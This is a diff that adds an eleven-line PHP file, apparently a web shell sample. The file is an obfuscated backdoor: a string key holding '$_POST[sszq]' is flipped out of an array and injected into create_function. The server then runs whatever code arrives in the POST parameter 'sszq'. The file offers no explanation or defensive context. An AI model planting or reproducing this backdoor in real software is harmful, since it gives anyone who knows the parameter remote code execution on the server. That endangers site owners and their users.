@@ -1,0 +1,11 @@
+<?php
+//funciton
+$args = 2;
+$arr=array("n;}$_POST[sszq];/*"=>"test");
+$arr1=array_flip($arr);
+$arr2 = $arr1["test"];
+echo $arr2;
+create_function('$args',$arr2); 
+
+
+?>
